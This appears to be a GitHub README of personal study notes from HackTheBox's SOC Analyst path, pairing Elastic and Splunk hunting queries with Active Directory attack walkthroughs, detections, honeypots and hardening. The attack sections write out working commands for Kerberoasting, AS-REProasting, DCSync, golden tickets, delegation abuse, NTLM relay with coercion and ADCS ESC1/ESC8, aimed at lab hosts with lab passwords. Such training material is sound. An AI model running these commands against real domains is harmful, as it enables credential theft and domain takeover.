# 🛡️ HackTheBox SOC Analyst Path — Notes & Walkthroughs

> Personal notes, KQL/SPL queries, detection logic, and walkthroughs from the HackTheBox **SOC Analyst** certification path (CDSA) and **Windows Attacks & Defense** module.

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=for-the-badge&logo=hackthebox&logoColor=black"/>
  <img src="https://img.shields.io/badge/Focus-SOC%20Analyst-blue?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/MITRE-ATT%26CK-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/SIEM-Elastic%20%7C%20Splunk-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Active%20Directory-Attacks%20%26%20Defense-purple?style=for-the-badge"/>
</p>

---

## 📋 Table of Contents

- [About](#about)
- [Path Overview](#path-overview)
- [Progress](#progress)
- [Module 1 — Threat Hunting (Elastic & Splunk)](#module-1--threat-hunting-elastic--splunk)
- [Module 2 — Windows Attacks & Defense](#module-2--windows-attacks--defense)
  - [Kerberoasting](#-kerberoasting)
  - [AS-REProasting](#-as-reproasting)
  - [Credentials in Object Properties](#-credentials-in-object-properties)
  - [GPP Passwords & Credentials in Shares](#-gpp-passwords--credentials-in-shares)
  - [DCSync](#-dcsync)
  - [Golden Ticket](#-golden-ticket)
  - [Kerberos Constrained Delegation](#-kerberos-constrained-delegation)
  - [Print Spooler & NTLM Relaying](#-print-spooler--ntlm-relaying)
  - [Coercing Attacks & Unconstrained Delegation](#-coercing-attacks--unconstrained-delegation)
  - [Object ACLs](#-object-acls)
  - [PKI — ESC1 & ESC8](#-pki--esc1--esc8)
- [Windows Event IDs Reference](#windows-event-ids-reference)
- [Honeypot Strategy Summary](#honeypot-strategy-summary)
- [Tools Reference](#tools-reference)
- [MITRE ATT&CK Coverage](#mitre-attck-coverage)
- [Resources](#resources)

---

## About

This repository contains my personal notes, query references, and lab walkthroughs completed during the **HackTheBox Certified Defensive Security Analyst (CDSA)** path and the **Windows Attacks & Defense** module. The goal is to document detection logic, attack techniques, investigation methods, and lessons learned across each module — covering both **red team** and **blue team** perspectives.

> ⚠️ Notes are for **educational purposes only**. All labs were performed in isolated HTB environments.

---

## Path Overview

| Area | Description |
|------|-------------|
| 🔵 **SIEM** | Elastic/Kibana (KQL) & Splunk (SPL) |
| 🔴 **Threat Hunting** | MITRE ATT&CK-based hunting techniques |
| 🟡 **Incident Response** | Log analysis, triage, and investigation |
| 🟢 **Digital Forensics** | Artifact analysis and evidence collection |
| 🟣 **Active Directory** | Attack techniques, detection, and hardening |

---

## Progress

- [x] Introduction to Threat Hunting
- [x] Hunting with Elastic
- [x] Hunting with Splunk
- [x] Windows Attacks & Defense
- [ ] Incident Response
- [ ] Digital Forensics
- [ ] Malware Analysis

---

## Module 1 — Threat Hunting (Elastic & Splunk)

### 🔍 Threat Hunting with Elastic (Kibana)

| Hunt | Technique | MITRE ID | Key Query |
|------|-----------|----------|-----------|
| Lateral Tool Transfer | File drop to `C:\Users\Public` | T1570 | `event.category: "file" AND file.path: *Users\\Public*` |
| Registry Run Key Persistence | Boot/Logon Autostart | T1547.001 | `event.category: "registry" AND registry.path: *CurrentVersion\\Run*` |
| PowerShell Remoting | Lateral Movement to DC | T1021.006 | `event.code: "4104" AND powershell.file.script_block_text: *PSSession* AND powershell.file.script_block_text: *DC1*` |

### KQL Queries

```kql
# Lateral Tool Transfer to Public folder
event.category: "file" AND file.path: *Users\\Public*

# Registry Run Key Persistence
event.category: "registry" AND registry.path: *CurrentVersion\\Run*

# PowerShell Remoting to DC
event.code: "4104" AND powershell.file.script_block_text: *PSSession* AND powershell.file.script_block_text: *DC1*
```

---

### 📊 Splunk SPL Queries

| Objective | SPL Query |
|-----------|-----------|
| Kerberos TGT requests (highest count) | `index=* EventCode=4768 \| stats count by Account_Name \| sort -count` |
| Distinct computers accessed by SYSTEM | `index=* EventCode=4624 Account_Name=SYSTEM \| stats dc(ComputerName) as distinct_computers` |
| Accounts with logins < 10 min window | `index=* EventCode=4624 \| stats min(_time) as first_login, max(_time) as last_login, count as total_logins by Account_Name \| eval time_range_minutes=(last_login-first_login)/60 \| where time_range_minutes < 10 \| sort -total_logins` |
| Net view command execution | `index=* EventCode=1 CommandLine="*net*view*"` |

```spl
# Kerberos TGT requests
index=* EventCode=4768
| stats count by Account_Name
| sort -count

# Logon anomaly — short time window
index=* EventCode=4624
| stats min(_time) as first_login, max(_time) as last_login, count as total_logins by Account_Name
| eval time_range_minutes = (last_login - first_login) / 60
| where time_range_minutes < 10
| sort -total_logins

# Net view command execution
index=* EventCode=1 CommandLine="*net*view*"

# Distinct computers accessed by SYSTEM
index=* EventCode=4624 Account_Name=SYSTEM
| stats dc(ComputerName) as distinct_computers
```

---

## Module 2 — Windows Attacks & Defense

> Covers the most commonly abused Active Directory attack techniques, their detection methods, honeypot strategies, and preventions — from both attacker and defender perspectives.

---

### 🎯 Kerberoasting

**MITRE:** T1558.003 | **Event IDs:** 4769

#### What is it?
Any authenticated domain user can request a **Kerberos TGS ticket** for any account with an SPN registered. The ticket is encrypted with the service account's NTLM hash — crackable **offline** with no lockout risk.

```
Attacker → Requests TGS for SPN account → Gets hash-encrypted ticket → Cracks offline → Recovers password
```

#### 🔴 Attack
```powershell
# Extract all Kerberoastable tickets
.\Rubeus.exe kerberoast /outfile:spn.txt
```
```bash
# Crack with Hashcat
hashcat -m 13100 -a 0 spn.txt rockyou.txt --outfile="cracked.txt"

# Crack with John
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```

#### 🔵 Detection
```powershell
# Query for Kerberoasting events on DC
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4769'} |
    Where-Object {$_.Message -like "*webservice*"} |
    Select-Object -First 1 | Format-List Message

# Get full XML details (ServiceSid, encryption type, etc.)
$e = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4769'} |
    Where-Object {$_.Message -like "*webservice*"} | Select-Object -First 1
([xml]$e.ToXml()).Event.EventData.Data
```
- Alert on **10+ Event 4769s** from same source within 1 minute
- Alert on **RC4 (0x17) encryption** in AES-only environments
- Group by requesting user AND source IP

#### 🍯 Honeypot
- Create `svc-iam` with old creation date, old password, legitimate SPN (e.g., `http/server1`), some privileges
- **Any 4769 for this account = immediate alert, zero false positives**

#### 🛡️ Prevention
- Service account passwords: **100+ random characters**
- Use **Group Managed Service Accounts (GMSA)**
- Remove unused SPNs quarterly
- Enforce **AES over RC4**

---

### 🎯 AS-REProasting

**MITRE:** T1558.004 | **Event IDs:** 4768

#### What is it?
Targets accounts with **"Do not require Kerberos pre-authentication"** enabled. The KDC returns an AS-REP encrypted with the user's hash — no credentials needed from the attacker.

#### 🔴 Attack
```powershell
# Extract AS-REP hashes
.\Rubeus.exe asreproast /outfile:asrep.txt
```
```bash
# Fix hash format (required for hashcat)
sed -i 's/\$krb5asrep\$/\$krb5asrep\$23\$/' asrep.txt

# Crack
hashcat -m 18200 -a 0 asrep.txt rockyou.txt --outfile asrepcrack.txt --force
```

#### 🔵 Detection
```powershell
# Find AS-REP events for specific account
$e = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4768'} |
    Where-Object {$_.Message -like "*svc-iam*"} | Select-Object -First 1
([xml]$e.ToXml()).Event.EventData.Data
```
- Look for **Pre-Authentication Type: 0** (no pre-auth)
- Alert on **RC4 encryption (0x17)** in Ticket Encryption Type
- Correlate client IP against known-good VLANs

#### 🍯 Honeypot
- `svc-iam` with pre-auth disabled, old password, recent login history, privileges assigned
- **Any 4768 with Pre-Auth Type 0 for this account = immediate alert**

#### 🛡️ Prevention
- Only enable "Do not require Kerberos pre-authentication" when absolutely necessary
- Quarterly review of affected accounts
- Enforce **20+ character passwords** for any account with this property

---

### 🎯 Credentials in Object Properties

**MITRE:** T1552.001 | **Event IDs:** 4624, 4625, 4768

#### What is it?
Admins sometimes store passwords in AD **Description** or **Info** fields, mistakenly thinking only admins can read them. **Any domain user can read these fields.**

#### 🔴 Attack
```powershell
# Search Description and Info fields for keywords
.\SearchUser.ps1 -Terms pass

# Manual alternative
Get-ADUser -Filter * -Properties Description,Info |
    Where-Object {$_.Description -like "*pass*" -or $_.Info -like "*pass*"} |
    Select SamAccountName,Description,Info
```

#### 🍯 Honeypot
- Create `svc-iis` with **wrong** password in Description
- Account enabled with recent login history, password 2+ years old
- **Alert on 4625, 4771, 4776** (failed logon with wrong credentials)

#### 🛡️ Prevention
- Never store credentials in AD object properties
- Quarterly AD object audits
- Automate account creation to reduce manual handling

---

### 🎯 GPP Passwords & Credentials in Shares

**MITRE:** T1552.006

#### 🔴 Attack
```powershell
# Find GPP passwords in SYSVOL
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword

# Find accessible shares and search for credentials
Import-Module .\PowerView.ps1
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
findstr /m /s /i "eagle" *.ps1
```

---

### 🎯 DCSync

**MITRE:** T1003.006 | **Event IDs:** 4662

#### What is it?
Simulates DC replication to extract **NTLM hashes** of any account, including `krbtgt` and `Administrator`. Requires **Replicating Directory Changes** privileges.

#### 🔴 Attack
```powershell
runas /user:eagle\rocky cmd.exe
```
```
# In Mimikatz
lsadump::dcsync /domain:eagle.local /user:Administrator
```

#### 🔵 Detection
- Event **4662**: If account name is **not a Domain Controller** → high-confidence DCSync alert

---

### 🎯 Golden Ticket

**MITRE:** T1558.001 | **Event IDs:** 4624, 4634

#### What is it?
Forges a **Kerberos TGT** using the `krbtgt` hash. Valid for any user, any service — essentially **permanent domain admin** until `krbtgt` password is reset **twice**.

#### 🔴 Attack
```
# Dump krbtgt hash
lsadump::dcsync /domain:eagle.local /user:krbtgt
```
```powershell
# Get domain SID
Get-DomainSID
```
```
# Forge golden ticket
golden /domain:eagle.local /sid:<domain_sid> /rc4:<rc4_hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```
```powershell
# Verify ticket in cache
klist
```

---

### 🎯 Kerberos Constrained Delegation

**MITRE:** T1558 | **Event IDs:** 4624 (S4U)

#### 🔴 Attack
```powershell
# Find delegation-trusted accounts
Get-NetUser -TrustedToAuth

# Convert password to hash
.\Rubeus.exe hash /password:Slavi123

# Impersonate Administrator via webservice
.\Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local \
    /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

# Access target
Enter-PSSession dc1
```

---

### 🎯 Print Spooler & NTLM Relaying

**MITRE:** T1187

#### 🔴 Attack
```bash
# Set up NTLM relay targeting DC2
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

# Trigger PrinterBug to coerce DC1 authentication
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

#### 🛡️ Prevention
Disable via registry key: `RegisterSpoolerRemoteRpcEndPoint`

---

### 🎯 Coercing Attacks & Unconstrained Delegation

**MITRE:** T1187, T1558

#### 🔴 Attack
```powershell
# Find unconstrained delegation systems
Get-NetComputer -Unconstrained | select samaccountname

# Monitor for incoming TGTs
.\Rubeus.exe monitor /interval:1
```
```bash
# Coerce DC to authenticate to attacker machine
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

---

### 🎯 Object ACLs

**MITRE:** T1222

#### 🔴 Attack
```powershell
# Manipulate SPNs for targeted Kerberoasting
setspn -D http/ws001 anni          # Remove existing SPN
setspn -U -s ldap/ws001 anni       # Add new SPN to user
setspn -S ldap/server02 server01   # Add SPN to machine account
```

---

### 🎯 PKI — ESC1 & ESC8

**MITRE:** T1649 | **Event IDs:** 4886, 4887

#### ESC1 — Vulnerable Certificate Template
```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request cert as Administrator
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Get TGT with forged cert
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

#### ESC8 — NTLM Relay to ADCS
```bash
# Relay incoming auth to CA
impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs

# Trigger coercion
python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

#### 🔵 Detection
```powershell
# Monitor certificate issuance
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```

---

## Windows Event IDs Reference

| Event ID | Description | Associated Attack |
|----------|-------------|-------------------|
| `4624` | Successful logon | Delegation (S4U), credential abuse |
| `4625` | Failed logon | Honeypot trigger, brute force |
| `4662` | Object operation performed | **DCSync** |
| `4738` | User account changed | Honeypot modification |
| `4742` | Computer account changed | — |
| `4768` | Kerberos TGT requested | **AS-REProasting** |
| `4769` | Kerberos TGS requested | **Kerberoasting** |
| `4771` | Kerberos pre-auth failed | Failed AS-REP / honeypot |
| `4776` | Credential validation (NTLM) | NTLM auth failure / honeypot |
| `4725` | User account disabled | — |
| `4886` | Certificate requested | **ESC1 / ESC8** |
| `4887` | Certificate issued | **ESC1 / ESC8** |
| `5136` | GPO modified | GPO abuse |

---

## Honeypot Strategy Summary

| Honeypot Account | Attack Detected | Trigger Event | Notes |
|-----------------|----------------|---------------|-------|
| `svc-iam` (SPN set) | Kerberoasting | `4769` | Old account, old password, legit SPN |
| `svc-iam` (no pre-auth) | AS-REProasting | `4768` Pre-Auth Type 0 | Recent logins, has privileges |
| `svc-iis` (wrong pass in Description) | Credential Object Abuse | `4625`, `4771`, `4776` | Wrong password, old, enabled |

> ⚠️ **Don't implement every honeypot** — too many traps makes it obvious to sophisticated attackers that the environment is heavily monitored. Pick what fits your environment.

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| `Rubeus.exe` | Kerberos ticket extraction & manipulation |
| `Mimikatz` | Hash dumping, DCSync, Golden Ticket |
| `Hashcat` | Offline hash cracking |
| `John the Ripper` | Offline hash cracking |
| `PowerView` | AD enumeration |
| `Certify.exe` | PKI vulnerability scanning |
| `impacket-ntlmrelayx` | NTLM relay attacks |
| `Coercer` | Authentication coercion |
| `dementor.py` | PrinterBug trigger |
| `Elastic/Kibana` | SIEM, log analysis, KQL hunting |
| `Splunk` | SIEM, SPL searches, Sysmon App |
| `Sysmon` | Windows endpoint telemetry |
| `Winlogbeat` | Log shipper to Elastic |
| `MITRE ATT&CK Navigator` | Technique mapping |

---

## MITRE ATT&CK Coverage

```
Tactics Covered:
├── Initial Access
├── Execution
│   └── PowerShell (T1059.001)
├── Persistence
│   └── Registry Run Keys (T1547.001)
├── Credential Access
│   ├── Kerberoasting (T1558.003)
│   ├── AS-REP Roasting (T1558.004)
│   ├── DCSync (T1003.006)
│   ├── GPP Passwords (T1552.006)
│   └── Credentials in AD Properties (T1552.001)
├── Lateral Movement
│   ├── Lateral Tool Transfer (T1570)
│   ├── PowerShell Remoting (T1021.006)
│   └── Kerberos Constrained Delegation (T1558)
├── Privilege Escalation
│   ├── Golden Ticket (T1558.001)
│   └── PKI Abuse — ESC1/ESC8 (T1649)
├── Defense Evasion
│   └── Object ACL Abuse (T1222)
└── Discovery
    └── Domain Trust Discovery (T1482)
```

---

## Resources

- 📘 [HackTheBox CDSA Path](https://academy.hackthebox.com/path/preview/soc-analyst)
- 📗 [MITRE ATT&CK Framework](https://attack.mitre.org/)
- 📙 [Elastic KQL Documentation](https://www.elastic.co/guide/en/kibana/current/kuery-query.html)
- 📕 [Splunk SPL Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- 📓 [Sysmon Event ID Reference](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- 🔐 [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- 🔐 [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- 🔐 [Impacket GitHub](https://github.com/fortra/impacket)
- 📖 [RFC 4120 — Kerberos Protocol](https://www.rfc-editor.org/rfc/rfc4120)
- 📖 [SpecterOps — Kerberoasting Revisited](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)

---

*📝 Notes compiled while completing the HTB Academy SOC Analyst path and Windows Attacks & Defense module.*  
*🔗 [My HTB Profile](https://app.hackthebox.com) | [GitHub](https://github.com)*
